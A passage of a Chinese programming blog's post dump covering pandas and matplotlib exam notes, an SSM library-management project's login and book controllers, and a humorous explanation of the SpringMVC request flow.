np.sin(x),np.cos(x)plt.plot(x,y,x,z)plt.plot([0.5,1,-0.5,1]) 程序分析： %matplotlib inline的作用是在Jupyter Notebook中显示图形，使用其他开发工具，这行代码可以不要 import matplotlib.pyplot as plt的作用是导入matplotlib的pyplot模块 x = np.linspace(-np.pi,np.pi,250)的作用是生成一个由250个浮点数组成的数组 y,z = np.sin(x),np.cos(x)的作用是计算出数组的正弦、余弦值，并赋值给y和z两个变量 plt.plot(x,y,x,z)绘制两条线形图，分别是正弦和余弦曲线 plt.plot([0.5,1,-0.5,1])绘制线形图，其中y轴的值是[0.5,1,-0.5,1]，而x轴的值是[0，1，2，3]，即数组[0.5,1,-0.5,1]的索引 十一、 示例3-25用figure函数创建子图subplot(nrows,ncols,plot_number)函数创建子图，其中参数nrows、ncols表示行数和列数，决定了子图的个数；plot_number表示当前是第几个子图。 利用figure()函数创建子图： 123456789%matplotlib inlineimport numpy as npimport matplotlib.pyplot as pltx = np.linspace(-np.pi,np.pi,50)y1,y2 = np.sin(x),np.cos(x)fig = plt.figure(figsize=(5,2))plt.plot(x,y1)fig = plt.figure(figsize=(5,2))plt.plot(x,y2) 十二、 pandas有哪几种数据结构、概念Pandas有3钟数据结构：系列(Series)、数据帧(DataFrame)和面板(Panel)，这些数据结构可以构建在Numpy数组上。 Series系列系列是具有均匀数据的一维数据结构，其特点是：均匀数据、尺寸大小不变、数据的值可变。 系列是能够保存任何数据类型的数据(整数、字符串、浮点数、Python对象等)的一维标记数组。 Pandas系列可以使用以下构造函数构建： 1pandas.Series(data,index,dtype,copy) 数据帧数据帧(DataFrame)是一个具有异构数据的二维数组，其特点是异构数据、大小可变、数据可变。数据帧是Pandas使用最多的数据结构。 数据以行和列表示，每行是一条记录(对象)，每列表示一个属性，属性数据具有数据类型。例如，姓名是字符串，年龄是整数，如表所示。 姓名 性别 年龄 身高 班级 小明 男 20 178 1班 小花 女 22 165 1班 小兰 女 19 163 2班 小胜 男 23 175 1班 Pandas中的DataFrame可以使用以下构造函数创建： 1Pandas.DataFrame(data,index,columns,dtype,copy) 面板面板是具有异构数据的三维数据结构。其特点是：异构数据、大小可变、数据可变。 可以使用以下构造函数创建面板： 1pandas.Panel(data,items,major_axis,minor_axis,dtype,copy) 十三、 数据帧DataFrame的定义和使用Pandas数据帧可以使用各种输入创建，如列表、字典、系列、NumPy的ndarrays、Series或另一个数据帧等。 123456789import pandas as pdimport numpy as npdf = pd.DataFrame()print(&#x27;创建空数据帧：&#x27;)print(df)data = np.arange(11,15)df1 = pd.DataFrame(data)print(&#x27;df1=&#x27;)print(df1) 1234567891011121314151617181920212223import pandas as pdimport numpy as npdf = pd.DataFrame()print(&#x27;创建空数据帧：&#x27;)print(df)data = np.arange(11,15)df1 = pd.DataFrame(data)print(&#x27;df1=&#x27;)print(df1)data = &#123;&#x27;name&#x27;:[&#x27;小明&#x27;,&#x27;小花&#x27;,&#x27;小兰&#x27;,&#x27;小胜&#x27;],&#x27;gender&#x27;:[&#x27;男&#x27;,&#x27;女&#x27;,&#x27;女&#x27;,&#x27;男&#x27;]&#125;df2 = pd.DataFrame(data)print(df2)data = [&#123;&#x27;name&#x27;:&#x27;小明&#x27;,&#x27;gender&#x27;:&#x27;男&#x27;&#125;,&#123;&#x27;name&#x27;:&#x27;小花&#x27;,&#x27;gender&#x27;:&#x27;女&#x27;,&#x27;age&#x27;:&#x27;22&#x27;&#125;]df3 = pd.DataFrame(data,index=[&#x27;1&#x27;,&#x27;2&#x27;],columns=[&#x27;name&#x27;,&#x27;gender&#x27;,&#x27;age&#x27;])print(&#x27;df3=&#x27;)print(df3)d = &#123;&#x27;a&#x27;:pd.Series(np.arange(3),index=[&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;]), &#x27;b&#x27;:pd.Series(np.arange(4),index=[&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;5&#x27;])&#125;df4 = pd.DataFrame(d)print(&#x27;df4=&#x27;)print(df4)print(&#x27;df2.index=&#x27;,df2.index)print(&#x27;df2.columns&#x27;,df2.columns) 十四、示例4-13更换索引reset_index()函数： reset_index()函数可以还原索引，重新变为默认的整型索引，其格式如下： 1DataFrame.reset_index(level=None,drop=False,inplace=False) 参数说明如下： level:控制了具体要还原的那个等级的索引 drop:为False，则索引列会被还原为普通列，否则会丢失 1234567891011121314import pandas as pdimport numpy as npdata = &#123;&#x27;name&#x27;:pd.Series([&#x27;小明&#x27;,&#x27;小花&#x27;,&#x27;小兰&#x27;,&#x27;小胜&#x27;]), &#x27;gender&#x27;:pd.Series([&#x27;男&#x27;,&#x27;女&#x27;,&#x27;女&#x27;,&#x27;男&#x27;]), &#x27;height&#x27;:pd.Series([178,165,163,175]), &#x27;age&#x27;:pd.Series([20,22,19,23]), &#x27;class&#x27;:pd.Series([&#x27;1班&#x27;,&#x27;1班&#x27;,&#x27;2班&#x27;,&#x27;1班&#x27;])&#125;df = pd.DataFrame(data)print(df)df1 = df.set_index(&#x27;name&#x27;)print(df1)print(df1.reset_index())print(df.set_index([&#x27;class&#x27;,&#x27;name&#x27;]))print(df.set_index([&#x27;class&#x27;,&#x27;name&#x27;]).index) 十五、示例4-21排序Pandas有两种排序方式，分别是：按标签排序和按实际值排序。 sort_index()函数1sort_index(axis=0,level=None,ascending=True,inplace=False,kind=&#x27;quicksort&#x27;,na_position=&#x27;last&#x27;,sort_remaining=True,by=None) 参数说明如下： axis：0按照行名排序；1按照列名排序。 level：默认None，否则按照给定的level顺序排列。 ascending：默认True升序排列；False降序排列。 inplace：默认False，否则排序之后的数据直接替换原来的数据集。 kind：默认quicksort，排序的方法(快速排序)。 na_position：缺失值默认排在最后{‘first’,’last’}。 by：按照那一列的数据进行排序。 sort_values()函数1DataFrame.sort_values(by,axis=0,ascending=True,inplace=False,kind=&#x27;quicksort&#x27;,na_position=&#x27;last&#x27;) 参数说明如下： axis：坐标轴，取值为0和1，默认为0.默认按照索引排序，即纵向排序，如果为1，则是横向排序。 by：是一个字符串或字符串列表，如果axis=0，则by=”列名”;如果axis=1，则by=”行名”。 ascending：布尔型，True则升序，可以是[True,False],即第一字段升序，第二个降序。 inplace：布尔型，是否用排序后的数据框替换现有的数据框。 kind：排序方法。 na_position:{‘first’,’last’},默认值为’last’，默认缺失值排在最后面。 123456789101112131415import pandas as pdimport numpy as npdata = np.array([[2,5,3,7],[16,14,2,16],[29,27,2,25]])df = pd.DataFrame(data,index=[0,4,2],columns=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;])print(&#x27;原数据帧&#x27;)print(df)print(&#x27;按行索引升序&#x27;)print(df.sort_index())print(&#x27;按行索引降序&#x27;)print(df.sort_index(ascending=False))print(&#x27;按列索引升序&#x27;)print(df.sort_index(axis=1))print(&#x27;按列索引降序&#x27;)print(df.sort_values(by=&#x27;b&#x27;))print(df.sort_values(by=[&#x27;b&#x27;,&#x27;c&#x27;])) 十六、数据清洗的定义数据清理主要是处理原始数据中的重复数据、缺失数据和异常数据，使数据分析不受无效数据影响。 十七、 缺失值（检测缺失值的方法？处理缺失值有哪几种方法？）数据采集中由于设备或人为原因可能造成的部分数据缺失，数据缺失会对数据分析造成不利影响，因此必须加以处理。 检测缺失值在处理缺失值前，需要先找到缺失值，使用人工查找缺失值，效率低而且容易遗漏。isnull()函数可以检查数据中缺失值，返回一个布尔矩阵，每一个布尔值表示对应位置的数据是否缺失。 notnull()函数与isnull()函数意思相反。返回的布尔值为True时表示非缺失值。 12345678910import pandas as pdimport numpy as npdf = pd.DataFrame(&#123;&#x27;a&#x27;:[1,2,np.nan,4], &#x27;b&#x27;:[5,np.nan,7,8], &#x27;c&#x27;:[9,10,11,np.nan], &#x27;d&#x27;:[13,14,15,16]&#125;)print(&#x27;原始数据：&#x27;)print(df)print(df.isnull())print(df.notnull()) 程序分析： df.isnull()函数返回df数据帧中的数据是否为NaN值的boolean型数据矩阵，如果数据为NaN值，矩阵对应位置为True，否则为False df.notnull()函数与df.isnull()函数返回的boolean值正好相反 处理缺失值缺失值处理主要有4种处理方法： 删除法 固定值替换法 填充法 插值法 删除法当有缺失值时，删除是最简单的处理方法，使用删除法要考虑两种情况：只要有NaN值就删除；都是NaN值才删除。删除NaN值数据通过函数dropna()实现。 参数how有两个取值：any表示如果存在任何NaN值，则删除该行数据，all表示如果所有的值均为NaN值，才删除该行。 参数thresh是一个int值，默认值为None，表示要求每排至少N个非NAN值。 参数subset是一个类似数组，表示全都是NaN值的集合。 参数inplace是一个boolean，默认值False，如果为True，则返回None，但是原数据被修改。 12345678910111213import pandas as pdimport numpy as npdf = pd.DataFrame(&#123;&#x27;a&#x27;:[1,2,np.nan,4], &#x27;b&#x27;:[5,np.nan,7,8], &#x27;c&#x27;:[9,10,11,np.nan], &#x27;d&#x27;:[13,14,15,16]&#125;)print(&#x27;原数据：&#x27;)print(df)print(&#x27;删除包含NaN值的行：&#x27;,df.dropna())print(&#x27;删除包含NaN值的列：&#x27;,df.dropna(axis=1))print(&#x27;删除都是NaN值的行：&#x27;,df.dropna(how=&#x27;all&#x27;))df.iloc[0]=np.nanprint(&#x27;第0行都是NaN值，删除：&#x27;,df.dropna(how=&#x27;all&#x27;)) 固定值替换法使用固定值替换NaN值，是一种简单的处理方法，但是效果不好。 123456789import pandas as pdimport numpy as npdf = pd.DataFrame(&#123;&#x27;a&#x27;:[1,2,np.nan,4], &#x27;b&#x27;:[5,np.nan,7,8], &#x27;c&#x27;:[9,10,11,np.nan], &#x27;d&#x27;:[13,14,15,16]&#125;)print(&#x27;原数据：&#x27;)print(df)print(df.replace(np.nan,0)) 填充法使用fillna()函数来填充NaN值，是一种常用的处理方法。 参数nethod取值：backfill、bfill、pad、ffill、None，默认值：None。pad、ffill表示向前填充，backfill、bfill表示向后填充。 1234567891011import pandas as pdimport numpy as npdf = pd.DataFrame(&#123;&#x27;a&#x27;:[1,2,np.nan,4], &#x27;b&#x27;:[5,np.nan,7,8], &#x27;c&#x27;:[9,10,11,np.nan], &#x27;d&#x27;:[13,14,15,16]&#125;)print(&#x27;原数据：&#x27;)print(df)print(df.fillna(0)) #固定值print(df.fillna(df.mean())) #平均值print(df.fillna(method=&#x27;bfill&#x27;)) #最近邻 插值法(牛逼的方法)上述处理缺失值的方法存在明显的缺陷，尤其是在数据量不够丰富时，删除法基本上是不具有可行性的，。除了上述方法外，还有一种效果更好的方法——插值法。 插值法有3种常用的方法：线性插值，多项式插值和样条插值。 线性插值是根据已知数值构建线性方程组，通过求解线性方程组获取缺失值； 多项式插值是通过拟合多项式，通过多项式求解缺失值，多项式插值中最常用的是拉格朗日插值法和牛顿插值法； 样条插值是通过可变样条做出一条经过一系列点的光滑曲线的插值方法； 线性插值和多项式插值： 1234567891011121314import numpy as npimport scipy.interpolate as interpolateimport matplotlib.pyplot as plt%matplotlib inlinea = [1,2,3,4,5,6,9,10,11,12]b = [10,16,21,32,35,43,58,62,67,70]print(a)print(b)linear=interpolate.interp1d(a,b,kind=&#x27;linear&#x27;) #注意这里是interp1d，是数字1不是字母lplt.plot(linear([1,2,3,4,5,6,7,8,9,10,11,12]),&#x27;-.&#x27;)print(&#x27;线性插值法求出的ss[7:9=]&#x27;,linear([7,8]))lagrange=interpolate.lagrange(a,b)plt.plot(lagrange([1,2,3,4,5,6,7,8,9,10,11,12]),&#x27;--&#x27;)print(&#x27;拉格朗日插值法求出的ss[2]=&#x27;,lagrange([7,8])) 样条插值： 123456789101112import scipy.interpolate as interpolateimport numpy as npimport matplotlib.pyplot as plt%matplotlib inlinex = np.linspace(-np.pi,np.pi,10)y = np.sin(x)plt.plot(x,y)tck = interpolate.splrep(x,y)x_new = np.linspace(-np.pi,np.pi,100)y_spine = interpolate.splev(x_new,tck)plt.figure()plt.plot(x_new,y_spine)","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"},{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"}]},{"title":"基于SSM图书管理项目的图书预约功能实现逻辑","date":"2021-06-16T06:14:14.000Z","path":"2021/06/16/基于SSM图书管理系统的图书预约功能实现逻辑/","text":"写在前面在写这篇博客时，图书管理系统的图书管理模块、用户管理模块已经实现。前两个模块已经写好了完善的Service，所以接下来在写预约模块的时候会省很多功夫。下面是一份简单的预约模块构造流程图： 预约模块各功能的设计登录逻辑图书管理模块与用户管理模块所使用的登录逻辑相同，即调用adminService来获取管理员的信息。但对于普通用户而言，本项目要设计一个新的Service出来，即user_login_Service。之所以起这种沙雕名字，是因为之前在为pojo下reader_info设计的时候，就已经使用了userService这一名字，它已经与Mapper绑定了，故另辟蹊径。 我们要做的准备是： 写出新的user_login_Service与对应的user_login_Mapper Controller依然沿用Book_manage，只需要导入user_login_Service和对应的pojo-&gt;reader_card 在Spring-service.xml中绑定Mapper 当然了，在写好后端前，要有个前端的jsp，视图层命名为user_login，继续沿用先前模块的登录设计 还要准备好登陆成功后跳转到的jsp页面，依然沿用先前的设计 做好准备后，要在Controller里面写出登录逻辑，逻辑流程图如下： 预约图书逻辑预约图书逻辑需要用到的模块比较多，当然，这是相较于之前的模块开发而言的。先盘点一下要使用的模块： 图书管理模块的Service 预约模块的Service lend_list对应的Service login_user对应的Service 上述是初步设想的要调用的Service，在实际开发过程中可能调用更多的Service，开发过程中再补充。如果很幸运地，我们只用到了这几个Service，那岂不是美滋滋。 下面是预约图书的逻辑流程图： 我们要做的准备是： 写出lend_list_Service，其对应的lend_Mapper，在Spring-service中配置bean。 沿用book_manage得到Controller，import相应的类(lend_list_Service)。并写出预约逻辑。 前端写出预约图书的页面，上部分为搜索框，下部分为对应的搜索结果和预约按钮。分为两个form表单。","comments":true,"categories":[{"name":"项目实战","slug":"项目实战","permalink":"http://1905060202.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"框架","slug":"框架","permalink":"http://1905060202.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"SpringMVC","slug":"SpringMVC","permalink":"http://1905060202.github.io/tags/SpringMVC/"}]},{"title":"基于SSM图书管理项目的图书管理各模块功能实现逻辑","date":"2021-06-15T08:45:24.000Z","path":"2021/06/15/基于SSM图书管理项目的各模块功能实现逻辑/","text":"关于登录逻辑登录逻辑的实现，具体流程图如下： 在Controller层的核心代码： 12345678910111213141516171819202122232425262728293031323334package com.hu.controller;import com.hu.pojo.admin;import com.hu.pojo.book_info;import com.hu.service.BookService;import com.hu.service.adminService;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import javax.annotation.Resource;import java.util.List;@SuppressWarnings(&quot;all&quot;)@Controller@RequestMapping(&quot;/book&quot;)public class adminController &#123; @Resource private adminService adminService; @Resource private BookService bookService; //check user @RequestMapping(&quot;/book_manage_2&quot;) public String login(admin admin, Model model) &#123; admin = adminService.checkLogin(admin.getAdmin_id(), admin.getPassword()); if (admin != null) &#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;, list); return &quot;book_manage&quot;; &#125; else &#123; return &quot;login&quot;; &#125; &#125;&#125; 在Service层的核心代码： 12345678910 @Override public admin checkLogin(int admin_id, String password) &#123; admin admin = adminMapper.queryadminById(admin_id); if(admin!=null&amp;&amp;admin.getPassword().equals(password))&#123; return admin; &#125;else&#123; return null; &#125; &#125;&#125; Service层删减了部分代码，其余具体代码请看点我白嫖 在login.jsp页面： 12345678910111213141516171819202122232425262728293031323334353637&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot; method=&quot;post&quot; class=&quot;form-horizontal &quot; role=&quot;form&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label class=&quot;col-sm-2 control-label&quot;&gt;账号：&lt;/label&gt; &lt;div class=&quot;col-sm-10&quot;&gt; &lt;input id=&quot;zh&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;账号&quot; name=&quot;admin_id&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label id=&quot;pwd&quot; class=&quot;col-sm-2 control-label&quot;&gt;密码：&lt;/label&gt; &lt;div class=&quot;col-sm-10&quot;&gt; &lt;input id=&quot;pwd_real&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;密码&quot; name=&quot;password&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;div class=&quot;col-sm-offset-2 col-sm-5&quot;&gt; &lt;button id=&quot;login&quot; type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt; 登录 &lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; $(&quot;#login&quot;).click(function checkpwdAndzh()&#123; var name = $(&quot;#zh&quot;).val(); var pass = $(&quot;#pwd_real&quot;).val(); if (name == &quot;&quot;) &#123; alert(&quot;用户名不能为空&quot;); return false; &#125; else if (pass == &quot;&quot;) &#123; alert(&quot;密码不能为空&quot;); return false; &#125; else&#123; return true; &#125; &#125;);&lt;/script&gt; login.jsp层删减了部分代码，只留下核心代码。 逻辑如代码所示，只是在实现的过程中碰到了一些棘手的问题。比如，通过ModelAndView向前端传递参数来实现登录成功与否的提示弹窗存在一些目前难以解决的逻辑bug。例如：登陆成功后，依然会弹出登陆失败的提示。碍于技术水平，此问题暂未得到解决，索性移除了弹窗提示。 关于上架图书逻辑首先来看登陆后，form表单提交的地址： 1&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot; method=&quot;post&quot; class=&quot;form-horizontal &quot; role=&quot;form&quot;&gt; 再来看一下配置了/book/book_manage_2的Controller： 123456789101112131415161718192021@Controller@RequestMapping(&quot;/book&quot;)public class adminController &#123; @Resource private adminService adminService; @Resource private BookService bookService; //check user @RequestMapping(&quot;/book_manage_2&quot;) public String login(admin admin, Model model) &#123; admin = adminService.checkLogin(admin.getAdmin_id(), admin.getPassword()); if (admin != null) &#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;, list); return &quot;book_manage&quot;; &#125; else &#123; return &quot;login&quot;; &#125; &#125;&#125; 登陆成功后，请求地址为: http://localhost:8080/ssm_build_book_war_exploded/book/book_manage_2 当我们选择上架图书模块时： 请求地址如图所示。 而此路径的配置在book_manage这个Controller里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@Controller@RequestMapping(&quot;/book&quot;)public class Book_manage &#123; @Resource private BookService bookService; @RequestMapping(&quot;/book_manage&quot;) public String get_Book_manage()&#123; return &quot;book_manage&quot;; &#125; // just return add_book page @RequestMapping(&quot;/add_book&quot;) public String add_book_page()&#123; return &quot;add_book&quot;; &#125; // just return delete_book page @RequestMapping(&quot;/delete_book&quot;) public String delete_book_page()&#123; return &quot;delete_book&quot;; &#125; //return admin book manage page @RequestMapping(&quot;/admin_overview_book&quot;) public String back_overview(Model model)&#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;,list); return &quot;book_manage&quot;; &#125; //implement add_book function @RequestMapping(&quot;/real_add_book&quot;) public String add_book(book_info book,Model model)&#123; int check = bookService.addbook(book); if (check&gt;0)&#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;,list); return &quot;book_manage&quot;; &#125; return &quot;add_book&quot;; &#125; //implement delete_book function @RequestMapping(&quot;/real_delete_book&quot;) public String delete_book(String book_id,Model model)&#123; int check = bookService.deleteBookById(Integer.parseInt(book_id)); if (check&gt;0)&#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;,list); return &quot;book_manage&quot;; &#125; model.addAttribute(&quot;check&quot;,&quot;fail&quot;); return &quot;delete_book&quot;; &#125;&#125; 上述为图书管理的整体配置(此时更新图书功能还未实现)，我们摘出与上架图书有关的代码： 12345678910111213141516//implement add_book function @RequestMapping(&quot;/real_add_book&quot;) public String add_book(book_info book,Model model)&#123; int check = bookService.addbook(book); if (check&gt;0)&#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;,list); return &quot;book_manage&quot;; &#125; return &quot;add_book&quot;; &#125;// just return add_book page @RequestMapping(&quot;/add_book&quot;) public String add_book_page()&#123; return &quot;add_book&quot;; &#125; 可以看到，跳转到add_book.jsp的方法有两种。但是这两种方法的作用并不相同。对于第二种方法，其主要的作用就是实现页面跳转，并不包含传参。之所以这么设计，是因为单纯的页面跳转并不需要传递参数，而上架图书功能需要传参，需要通过Service访问数据库。如果将两者统一为一个方法，那么在页面跳转的时候会因为没有携带参数而出现错误。什么时候需要单纯的跳转页面呢？很简单，我们的第一次访问上架图书功能模块，这个跳转，并不需要参数。 上架图书逻辑图如下： 关于下架图书逻辑下架图书与上架图书的Controller构造基本相同(本身他们也在同一个Controller内)。同样的，需要两个方法，一个实现传参，一个单纯的用于跳转。过多细节不再赘述，具体内容请看代码： 1234567891011121314151617 //implement delete_book function @RequestMapping(&quot;/real_delete_book&quot;) public String delete_book(String book_id,Model model)&#123; int check = bookService.deleteBookById(Integer.parseInt(book_id)); if (check&gt;0)&#123; List&lt;book_info&gt; list = bookService.queryAllBook(); model.addAttribute(&quot;list&quot;,list); return &quot;book_manage&quot;; &#125; model.addAttribute(&quot;check&quot;,&quot;fail&quot;); return &quot;delete_book&quot;; &#125;// just return delete_book page @RequestMapping(&quot;/delete_book&quot;) public String delete_book_page()&#123; return &quot;delete_book&quot;; &#125;","comments":true,"categories":[{"name":"项目实战","slug":"项目实战","permalink":"http://1905060202.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"框架","slug":"框架","permalink":"http://1905060202.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"SpringMVC","slug":"SpringMVC","permalink":"http://1905060202.github.io/tags/SpringMVC/"}]},{"title":"详解SpringMVC执行原理","date":"2021-06-12T13:54:36.000Z","path":"2021/06/12/详解SpringMVC执行原理/","text":"详解SpringMVC执行原理 图为SpringMVC的一个比较完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。 简要分析执行流程 DIspatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DIspatcherServlet接收请求并拦截请求。我们假设请求的url为：localhost:8080/SpringMVC/hello。如上url拆分成三部分： http:localhost:8080服务器域名 SpringMVC部署在服务器上的web站点 hello表示控制器 通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。 HandlerMapping为处理器映射。DIspatcherServlet调用HandleMapping，HandlerMapping根据请求url查找Handler。 HandlerExecution表示具体的的Handler，其主要作用是根据url查找控制器，如上url被查找控制器为：hello。 HandlerExecution将解析后的信息传递给DIspatcherServlet，如解析控制器映射等。 HandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。 Handler让具体的Controller执行 Controller将具体的执行信息返回给HandlerAdapter，如ModelAndView。 HandlerAdapter将视图逻辑名或模型传给DIspatcherServlet DIspatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。 视图解析器将解析的逻辑视图名传给DIspatcherServlet DIspatcherServlet根据视图解析器解析的视图结果，调用具体的视图。 最终视图呈现给用户 关于SpringMVC的配置（结合上面的流程来理解） 首先在web.xml中配置DIspatcherServlet 1234567891011121314151617 &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; //绑定文件，方便以后直接使用 &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; //resource下的applicationContext.xml &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; //用户发出的请求都会被它接收、拦截 &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; 对于Spring-mvc.xml的配置 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;&lt;!--1.note driver--&gt; &lt;mvc:annotation-driven/&gt; &lt;!--2.static resource filter--&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!--3.scan controller--&gt; &lt;context:component-scan base-package=&quot;com.hu.controller&quot;/&gt; &lt;!--view--&gt; &lt;!--视图解析器1.获取了ModelAndView的数据2.解析ModelAndView的视图名字3.拼接视图名字、找到对应的视图4.将数据渲染到视图上--&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; 解释7、8、9、10、11步： 在Controller中return了一个视图(“login”)，并且通过Model返回了数据(也可以说是ModelAndView，比如一个list集合)。HandlerAdapter把这些信息给了DIspatcherServlet(model:一个list集合，view:”login” – 这个login是jsp文件名，也就是自己写的小页面。而model带的list数据将会传递给login这个页面)。 DIspatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。说人话就是，DIspatcherServlet调用了一个小弟，这个小弟是用来拼接url的。在上述的Spring-mvc.xml文件中，你可以在标签中找到这个小弟。它有两个属性，一个是prefix，另一个是suffix。字面意思理解一下，pre-前面，fix-修复。所以它就是”修复残缺的url”的工具。prefix修复前缀，suffix修复后缀。比如，DIspatcherServlet拿来刚才HandlerAdapter传递的逻辑视图名传递的”login”，把”login”送给小弟(ViewResolver)去修复一下url(拼接url)。拼接好了之后，按照如上的bean配置，得到的url即为：/WEB-INF/jsp/login.jsp。小弟搞好了之后再把它交给大哥DIspatcherServlet。 DIspatcherServlet根据视图解析器解析的视图结果，调用具体的视图。收到了修补后的url，DIspatcherServlet根据这个url帮我们进行了网页的跳转。所谓的呈现具体视图，就是网页~ 解释1、2、3、4、5、6： 用户通过发起了请求：”喂！服务器！你TM的醒醒！我要去你那儿访问个东西！url是:”localhost:8080/SpringMVC/hello”，你最好赶快帮我找！”。 服务器一看：”8080，这不就是老子的地址嘛！SpringMVC，这不是我罩着的web文件夹吗！文件夹里面都是web的东西，什么jsp啦，css，什么的。我再仔细定睛一看，你TM的这个小用户，原来是想找hello这个Controller来帮你做事情啊！” 这个时候呢，DIspatcherServlet这个大哥就让HandlerMapping这个东西根据用户发来的url查找对应的handler。handler去找到底有没有用户想找的controller(hello)。找到了就返回给DIspatcherServlet，然后DIspatcherServlet大哥再通过HandlerAdapter来调用Controller。 整合解释： 老王想去p站看小电影，他之前不满于平民的视频清晰度，为此老王充了会员。现在尊贵的会员要登录p站看小电影了。他在输入框内敲下了奢华的账号与密码，点击”登录”！ 就在这个平平无奇的点击登录操作背后，后端上演的是一场狂风暴雨与惊涛骇浪。当然了，它也蕴藏着无数程序员的夜不能寐和他们所剩无几的几根倔强与坚强。 在前端input标签内，action属性剑指请求，method里面是卑微的请求方法(毕竟要跟服务器大哥说话，还是放尊重点用个post吧！)。当尊贵的小王点击登录按钮后，前端的submit脑海中一阵电流钻过，请求发过去了。 服务器大哥(DIspatcherServlet)看到了请求，”localhost:8080/SpringMVC/hello”。这个请求曾原模原样的写在action里面。服务器大哥(DIspatcherServlet)开始分析用户的请求了:”emm…8080是我，Tomcat本尊所在的地址(这地址其实是开发者分给我的，我多么想在8488端口啊，如果有的话…！就是没这王者的命啊！)。而SpringMVC是本服务器下面的一个文件夹，里面是开发者曾部署给我的web文件，等会我的操作还得靠里面的文件嘞！！至于hello嘛，是用户想找的Controller，用它来实现某种功能！”。服务器大哥分析完了之后，就把这种事交给手下的小弟去做了。大哥吆喝了几个小弟，他们是HandlerMapping、HandlerAdapter、ViewResolver。这些小弟开始干活了，小弟们实现了各种操作，他们要做的就是把做完的事报告给大哥，然后让大哥在顶层做决策。守得云开见月明，大哥看到所有操作都over了，就返给了用户一个结果。 老王一看，我擦，密码错误！？重新输入密码，还是不对！TMD，你知不知道反复做这种操作后端都经历了什么啊！老王瘫在椅子上，好家伙，自己花了999软妹币充值的十年vip账号让别人盗了！事后老王惆怅不已，在家书里写下了这样一段话:”吾子孙，万不可玩p站。” 厘清一些误解： 